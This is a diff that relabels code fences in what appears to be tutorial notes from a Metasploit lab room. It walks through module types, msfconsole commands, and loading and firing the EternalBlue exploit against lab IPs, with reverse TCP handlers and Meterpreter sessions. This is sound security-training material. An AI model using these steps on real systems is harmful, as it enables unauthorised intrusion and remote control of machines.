@@ -70,7 +70,7 @@ Auxiliary
 Any supporting module, such as scanners, crawlers and fuzzers, can be found here.
 
   Terminal 
-```Terminal 
+```bash
 root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 auxiliary/
 auxiliary/
 ├── admin
@@ -106,7 +106,7 @@ Encoders will allow you to encode the exploit and payload in the hope that a sig
 Signature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks.
 
   Terminal 
-```Terminal 
+```bash
 root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 encoders/
 encoders/
 ├── cmd
@@ -128,7 +128,7 @@ encoders/
 While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.
 
   Terminal 
-```Terminal 
+```bash
 root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/
 evasion/
 └── windows
@@ -150,7 +150,7 @@ evasion/
 Exploits, neatly organized by target system.
 
   Terminal 
-```Terminal 
+```bash
 root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/
 exploits/
 ├── aix
@@ -186,7 +186,7 @@ exploits/
 NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
 
   Terminal 
-```Terminal 
+```bash
 root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/
 nops/
 ├── aarch64
@@ -212,7 +212,7 @@ Exploits will leverage a vulnerability on the target system, but to achieve the 
 Running command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a "shell". Metasploit offers the ability to send different payloads that can open shells on the target system.
 
   Terminal 
-```Terminal 
+```bash
 root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/
 payloads/
 ├── adapters
@@ -242,7 +242,7 @@ Post
 Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.
 
   Terminal 
-```Terminal 
+```bash
 root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 post/
 post/
 ├── aix
@@ -307,7 +307,7 @@ Correct Answer
 As previously mentioned, the console will be your main interface to the Metasploit Framework. You can launch it using the `msfconsole` command on your AttackBox terminal or any system the Metasploit Framework is installed on.
 
     msfconsole  
-```msfconsole 
+```bash
 root@ip-10-10-220-191:~# msfconsole 
                                                   
 
@@ -343,7 +343,7 @@ msf6 >
  It is followed by a `ping` sent to Google's DNS IP address (8.8.8.8). As we operate from the AttackBox, which is Linux we had to add the `-c 1` option, so only a single ping was sent. Otherwise, the ping process would continue until it is stopped using `CTRL+C`.
 
     Linux Commands in Metasploit  
-```Linux Commands in Metasploit 
+```bash
 msf6 > ls
 [*] exec: ls
 
@@ -366,7 +366,7 @@ msf6 >
  It will support most Linux commands, including `clear` (to clear the terminal screen), but will not allow you to use some features of a regular command line (e.g. does not support output redirection), as seen below.
 
     Failed Output Redirection  
-```Failed Output Redirection 
+```bash
 msf6 > help > help.txt
 [-] No such command
 msf6 >
@@ -376,7 +376,7 @@ msf6 >
  While on the subject, the help command can be used on its own or for a specific command. Below is the help menu for the set command we will cover soon.
 
     Help feature  
-```Help feature 
+```bash
 msf6 > help set
 Usage: set [option] [value]
 
@@ -395,7 +395,7 @@ msf6 >
  You can use the history command to see commands you have typed earlier.
 
     History command  
-```History command 
+```bash
 msf6 > history
 1  use exploit/multi/http/nostromo_code_exec
 2  set lhost 10.10.16.17
@@ -419,7 +419,7 @@ msf6 > history
  Once you type the `use exploit/windows/smb/ms17_010_eternalblue` command, you will see the command line prompt change from msf6 to “msf6 exploit(windows/smb/ms17_010_eternalblue)”. The "EternalBlue" is an exploit allegedly developed by the U.S. National Security Agency (N.S.A.) for a vulnerability affecting the SMBv1 server on numerous Windows systems. The SMB (Server Message Block) is widely used in Windows networks for file sharing and even for sending files to printers. EternalBlue was leaked by the cybercriminal group "Shadow Brokers" in April 2017. In May 2017, this vulnerability was exploited worldwide in the WannaCry ransomware attack.
 
     Using an exploit  
-```Using an exploit 
+```bash
 msf6 > use exploit/windows/smb/ms17_010_eternalblue 
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_eternalblue) >
@@ -432,7 +432,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) >
  While the prompt has changed, you will notice we can still run the commands previously mentioned. This means we did not "enter" a folder as you would typically expect in an operating system command line.
 
     Linux commands within a context  
-```Linux commands within a context 
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > ls
 [*] exec: ls
 
@@ -446,7 +446,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) >
  The prompt tells us we now have a context set in which we will work. You can see this by typing the show options command.
 
     Show options  
-```Show options 
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
 
 Module options (exploit/windows/smb/ms17_010_eternalblue):
@@ -482,7 +482,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) >
  This will print options related to the exploit we have chosen earlier. The show options command will have different outputs depending on the context it is used in. The example above shows that this exploit will require we set variables like RHOSTS and RPORT. On the other hand, a post-exploitation module may only need us to set a SESSION ID (see the screenshot below). A session is an existing connection to the target system that the post-exploitation module will use.
 
     Options for a post-exploitation module  
-```Options for a post-exploitation module 
+```bash
 msf6 post(windows/gather/enum_domain_users) > show options
 
 Module options (post/windows/gather/enum_domain_users):
@@ -500,7 +500,7 @@ msf6 post(windows/gather/enum_domain_users) >
  The `show` command can be used in any context followed by a module type (auxiliary, payload, exploit, etc.) to list available modules. The example below lists payloads that can be used with the ms17-010 Eternalblue exploit.
 
     The show payloads command  
-```The show payloads command 
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
 
 Compatible Payloads
@@ -526,7 +526,7 @@ Compatible Payloads
  You can leave the context using the `back` command.
 
     The back command  
-```The back command 
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > back
 msf6 >
 ```
@@ -535,7 +535,7 @@ msf6 >
  Further information on any module can be obtained by typing the `info` command within its context.
 
     The info command  
-```The info command 
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > info
 
        Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
@@ -621,7 +621,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) >
  
 
     The search command  
-```The search command 
+```bash
 msf6 > search ms17-010
 
 Matching Modules
@@ -662,7 +662,7 @@ msf6 >
  
 
     Search by module type  
-```Search by module type 
+```bash
 msf6 > search type:auxiliary telnet
 
 Matching Modules
@@ -729,7 +729,7 @@ You can launch the target machine attached to this room to replicate the example
 - **The regular command prompt:**  You can not use Metasploit commands here.
 
     Regular command prompt  
-```Regular command prompt 
+```bash
 root@ip-10-10-XX-XX:~#
 ```
 
@@ -741,7 +741,7 @@ root@ip-10-10-XX-XX:~#
  
 
     Metasploit command prompt  
-```Metasploit command prompt 
+```bash
 msf6 >
 ```
 
@@ -750,7 +750,7 @@ msf6 >
 - **A context prompt:** Once you have decided to use a module and used the set command to chose it, the msfconsole will show the context. You can use context-specific commands (e.g. set RHOSTS 10.10.x.x) here.
 
     A context command prompt  
-```A context command prompt 
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) >
 ```
 
@@ -761,7 +761,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) >
  
 
     A Meterpreter command prompt  
-```A Meterpreter command prompt 
+```bash
 meterpreter >
 ```
 
@@ -773,7 +773,7 @@ meterpreter >
  
 
     A Meterpreter command prompt  
-```A Meterpreter command prompt 
+```bash
 C:\Windows\system32>
 ```
 
@@ -782,7 +782,7 @@ C:\Windows\system32>
  As mentioned earlier, the `show options` command will list all available parameters.
 
     The show options command  
-```The show options command 
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
 
 Module options (exploit/windows/smb/ms17_010_eternalblue):
@@ -822,7 +822,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) >
  
 
     A Meterpreter command prompt  
-```A Meterpreter command prompt 
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39
 rhosts => 10.10.165.39
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
@@ -880,7 +880,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) >
  You can override any set parameter using the set command again with a different value. You can also clear any parameter value using the `unset` command or clear all set parameters with the `unset all` command.
 
     The unset all command  
-```The unset all command 
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > unset all
 Flushing datastore...
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
@@ -924,7 +924,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) >
  
 
     Navigating modules  
-```Navigating modules 
+```bash
 msf6 > use exploit/windows/smb/ms17_010_eternalblue 
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.165.39
@@ -967,7 +967,7 @@ msf6 auxiliary(scanner/smb/smb_ms17_010) >
  
 
     The exploit -z command  
-```The exploit -z command 
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
 
 [*] Started reverse TCP handler on 10.10.44.70:4444 
@@ -1020,7 +1020,7 @@ Once a vulnerability has been successfully exploited, a session will be created.
  
 
     Backgrounding sessions  
-```Backgrounding sessions 
+```bash
 meterpreter > background
 [*] Backgrounding session 2...
 msf6 exploit(windows/smb/ms17_010_eternalblue) >
@@ -1034,7 +1034,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) >
  
 
     Listing active sessions  
-```Listing active sessions 
+```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
 
 Active sessions
@@ -1063,7 +1063,7 @@ msf6 >
  To interact with any session, you can use the `sessions -i` command followed by the desired session number.
 
     Interacting with sessions  
-```Interacting with sessions 
+```bash
 msf6 > sessions
 
 Active sessions
